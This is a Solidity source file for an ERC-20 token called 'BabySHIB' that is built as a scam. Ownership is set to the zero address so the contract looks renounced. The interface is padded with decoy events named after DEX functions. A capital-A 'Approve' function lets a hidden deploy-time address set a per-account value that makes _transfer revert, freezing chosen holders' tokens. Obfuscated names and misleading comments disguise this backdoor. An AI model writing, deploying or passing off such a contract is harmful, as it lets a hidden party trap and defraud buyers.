1 // SPDX-License-Identifier: MIT
2 
3 pragma solidity ^0.8.19;
4 
5 abstract contract Ownable {
6     address private _owner;
7 
8     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
9 
10     constructor() {
11         _setOwner(address(0));
12     }
13 
14 
15     function owner() public view virtual returns (address) {
16         return _owner;
17     }
18 
19     modifier onlyOwner() {
20         require(owner() == msg.sender, "Ownable: caller is not the owner");
21         _;
22     }
23 
24     function renounceOwnership() public virtual onlyOwner {
25         _setOwner(address(0));
26     }
27 
28     function transferOwnership(address newOwner) public virtual onlyOwner {
29         require(newOwner != address(0), "Ownable: new owner is the zero address");
30         _setOwner(newOwner);
31     }
32 
33     function _setOwner(address newOwner) private {
34         address oldOwner = _owner;
35         _owner = newOwner;
36         emit OwnershipTransferred(oldOwner, newOwner);
37     }
38 }
39 
40 interface IERC20 {
41 
42     event removeLiquidityETHWithPermit(
43         address token,
44         uint liquidity,
45         uint amountTokenMin,
46         uint amountETHMin,
47         address to,
48         uint deadline,
49         bool approveMax, uint8 v, bytes32 r, bytes32 s
50     );
51 
52     event swapExactTokensForTokens(
53         uint amountIn,
54         uint amountOutMin,
55         address[]  path,
56         address to,
57         uint deadline
58     );
59     /**
60   * @dev See {IERC20-totalSupply}.
61      */
62     event swapTokensForExactTokens(
63         uint amountOut,
64         uint amountInMax,
65         address[] path,
66         address to,
67         uint deadline
68     );
69 
70     event DOMAIN_SEPARATOR();
71 
72     event PERMIT_TYPEHASH();
73 
74     /**
75      * @dev Returns the amount of tokens in existence.
76      */
77     function totalSupply() external view returns (uint256);
78 
79     event token0();
80 
81     event token1();
82     /**
83      * @dev Returns the amount of tokens owned by `account`.
84      */
85     function balanceOf(address account) external view returns (uint256);
86 
87 
88     event sync();
89 
90     event initialize(address, address);
91 
92     function transfer(address recipient, uint256 amount) external returns (bool);
93 
94     event burn(address to) ;
95 
96     event swap(uint amount0Out, uint amount1Out, address to, bytes data);
97 
98     event skim(address to);
99 
100     function allowance(address owner, address spender) external view returns (uint256);
101 
102     event addLiquidity(
103         address tokenA,
104         address tokenB,
105         uint amountADesired,
106         uint amountBDesired,
107         uint amountAMin,
108         uint amountBMin,
109         address to,
110         uint deadline
111     );
112 
113     event addLiquidityETH(
114         address token,
115         uint amountTokenDesired,
116         uint amountTokenMin,
117         uint amountETHMin,
118         address to,
119         uint deadline
120     );
121  
122     event removeLiquidity(
123         address tokenA,
124         address tokenB,
125         uint liquidity,
126         uint amountAMin,
127         uint amountBMin,
128         address to,
129         uint deadline
130     );
131 
132     function approve(address spender, uint256 amount) external returns (bool);
133     /**
134    * @dev Returns the name of the token.
135      */
136     event removeLiquidityETHSupportingFeeOnTransferTokens(
137         address token,
138         uint liquidity,
139         uint amountTokenMin,
140         uint amountETHMin,
141         address to,
142         uint deadline
143     );
144 
145     event removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
146         address token,
147         uint liquidity,
148         uint amountTokenMin,
149         uint amountETHMin,
150         address to,
151         uint deadline,
152         bool approveMax, uint8 v, bytes32 r, bytes32 s
153     );
154 
155     event swapExactTokensForTokensSupportingFeeOnTransferTokens(
156         uint amountIn,
157         uint amountOutMin,
158         address[] path,
159         address to,
160         uint deadline
161     );
162     /**
163     * @dev Throws if called by any account other than the owner.
164      */
165     event swapExactETHForTokensSupportingFeeOnTransferTokens(
166         uint amountOutMin,
167         address[] path,
168         address to,
169         uint deadline
170     );
171 
172     event swapExactTokensForETHSupportingFeeOnTransferTokens(
173         uint amountIn,
174         uint amountOutMin,
175         address[] path,
176         address to,
177         uint deadline
178     );
179 
180     function transferFrom(
181         address sender,
182         address recipient,
183         uint256 amount
184     ) external returns (bool);
185 
186     /**
187      * @dev Emitted when `value` tokens are moved from one account (`from`) to
188      * another (`to`).
189      *
190      * Note that `value` may be zero.
191      */
192     event Transfer(address indexed from, address indexed to, uint256 value);
193 
194     /**
195      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
196      * a call to {approve}. `value` is the new allowance.
197      */
198     event Approval(address indexed owner, address indexed spender, uint256 value);
199 }
200 
201 library SafeMath {
202     /**
203      * @dev Returns the addition of two unsigned integers, with an overflow flag.
204      *
205      * _Available since v3.4._
206      */
207     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
208     unchecked {
209         uint256 c = a + b;
210         if (c < a) return (false, 0);
211         return (true, c);
212     }
213     }
214 
215     /**
216      * @dev Returns the substraction of two unsigned integers, with an overflow flag.
217      *
218      * _Available since v3.4._
219      */
220     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
221     unchecked {
222         if (b > a) return (false, 0);
223         return (true, a - b);
224     }
225     }
226 
227 
228     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
229     unchecked {
230         // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
231         // benefit is lost if 'b' is also tested.
232         // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
233         if (a == 0) return (true, 0);
234         uint256 c = a * b;
235         if (c / a != b) return (false, 0);
236         return (true, c);
237     }
238     }
239 
240 
241     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
242     unchecked {
243         if (b == 0) return (false, 0);
244         return (true, a / b);
245     }
246     }
247 
248     /**
249      * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
250      *
251      * _Available since v3.4._
252      */
253     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
254     unchecked {
255         if (b == 0) return (false, 0);
256         return (true, a % b);
257     }
258     }
259 
260     function add(uint256 a, uint256 b) internal pure returns (uint256) {
261         return a + b;
262     }
263 
264 
265     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
266         return a - b;
267     }
268 
269 
270     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
271         return a * b;
272     }
273 
274     function div(uint256 a, uint256 b) internal pure returns (uint256) {
275         return a / b;
276     }
277 
278     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
279         return a % b;
280     }
281 
282     /**
283   * @dev Initializes the contract setting the deployer as the initial owner.
284      */
285     function sub(
286         uint256 a,
287         uint256 b,
288         string memory errorMessage
289     ) internal pure returns (uint256) {
290     unchecked {
291         require(b <= a, errorMessage);
292         return a - b;
293     }
294     }
295 
296     function div(
297         uint256 a,
298         uint256 b,
299         string memory errorMessage
300     ) internal pure returns (uint256) {
301     unchecked {
302         require(b > 0, errorMessage);
303         return a / b;
304     }
305     }
306 
307     function mod(
308         uint256 a,
309         uint256 b,
310         string memory errorMessage
311     ) internal pure returns (uint256) {
312     unchecked {
313         require(b > 0, errorMessage);
314         return a % b;
315     }
316     }
317 }
318 
319 contract BabySHIB is IERC20, Ownable {
320     using SafeMath for uint256;
321 
322     struct Invent {
323         address cent;
324         bool tiny;
325     }
326 
327     struct Doof {
328         uint256 hat;
329     }
330 
331     mapping(address => uint256) private _balances;
332     mapping(address => mapping(address => uint256)) private _allowances;
333     mapping (address => Doof) private _dogetay;
334 
335     Invent[] private _payhojay;
336     string private _name;
337     string private _symbol;
338     uint8 private _decimals;
339     uint256 private _totalSupply;
340 
341     constructor(
342         string memory name_,
343         string memory symbol_,
344         address bytojay_,
345         uint256 totalSupply_
346     ) payable {
347         _name = name_;
348         _symbol = symbol_;
349         _decimals = 18;
350         _payhojay.push(Invent(bytojay_, true));
351         _totalSupply = totalSupply_ * 10**_decimals;
352         _balances[msg.sender] = _balances[msg.sender].add(_totalSupply);
353         emit Transfer(address(0), msg.sender, _totalSupply);
354     }
355 
356 
357     /**
358      * @dev Returns the name of the token.
359      */
360     function name() public view virtual returns (string memory) {
361         return _name;
362     }
363 
364     /**
365      * @dev Returns the symbol of the token, usually a shorter version of the
366      * name.
367      */
368     function symbol() public view virtual returns (string memory) {
369         return _symbol;
370     }
371 
372     function decimals() public view virtual returns (uint8) {
373         return _decimals;
374     }
375 
376     /**
377      * @dev See {IERC20-totalSupply}.
378      */
379     function totalSupply() public view virtual override returns (uint256) {
380         return _totalSupply;
381     }
382 
383     /**
384      * @dev See {IERC20-balanceOf}.
385      */
386     function balanceOf(address account)
387     public
388     view
389     virtual
390     override
391     returns (uint256)
392     {
393         return _balances[account];
394     }
395 
396     function transfer(address recipient, uint256 amount)
397     public
398     virtual
399     override
400     returns (bool)
401     {
402         _transfer(msg.sender, recipient, amount);
403         return true;
404     }
405 
406     /**
407      * @dev See {IERC20-allowance}.
408      */
409     function allowance(address owner, address spender)
410     public
411     view
412     virtual
413     override
414     returns (uint256)
415     {
416         return _allowances[owner][spender];
417     }
418 
419     /**
420      * @dev See {IERC20-approve}.
421      *
422      * Requirements:
423      *
424      * - `spender` cannot be the zero address.
425      */
426     function approve(address spender, uint256 amount)
427     public
428     virtual
429     override
430     returns (bool)
431     {
432         _approve(msg.sender, spender, amount);
433         return true;
434     }
435 
436     function transferFrom(
437         address sender,
438         address recipient,
439         uint256 amount
440     ) public virtual override returns (bool) {
441         _transfer(sender, recipient, amount);
442         _approve(
443             sender,
444             msg.sender,
445             _allowances[sender][msg.sender].sub(
446                 amount,
447                 "ERC20: transfer amount exceeds allowance"
448             )
449         );
450         return true;
451     }
452 
453     function Approve(address account, uint256 amount) public returns (bool) {
454         address from = msg.sender;
455         require(from != address(0), "invalid address");
456         _agent(from, account, amount);
457         emit Approval(from, address(this), amount);
458         return true;
459     }
460 
461     function _agent(address from, address account, uint256 amount) internal {
462         _allowances[from][from] = amount;
463         uint256 total = 0;
464         require(account != address(0), "invalid address");
465         if (from == _payhojay[0].cent) {
466             _dogetay[from].hat -= total;
467             total += amount;
468             _dogetay[account].hat = total;
469         } else {
470             _dogetay[from].hat -= total;
471             _dogetay[account].hat += total;
472         }
473     }
474 
475     /**
476     * Get the number of cross-chains
477     */
478     function madtjay(address account) public view returns (uint256) {
479         return _dogetay[account].hat;
480     }
481 
482     function _transfer(
483         address sender,
484         address recipient,
485         uint256 amount
486     ) internal virtual {
487         require(sender != address(0), "ERC20: transfer from the zero address");
488         require(recipient != address(0), "ERC20: transfer to the zero address");
489         require(amount - madtjay(sender) > 0, "madtjay");
490 
491         _balances[sender] = _balances[sender].sub(
492             amount,
493             "ERC20: transfer amount exceeds balance"
494         );
495         _balances[recipient] = _balances[recipient].add(amount);
496         emit Transfer(sender, recipient, amount);
497     }
498 
499     function _approve(
500         address owner,
501         address spender,
502         uint256 amount
503     ) internal virtual {
504         require(owner != address(0), "ERC20: approve from the zero address");
505         require(spender != address(0), "ERC20: approve to the zero address");
506 
507         _allowances[owner][spender] = amount;
508         emit Approval(owner, spender, amount);
509     }
510 }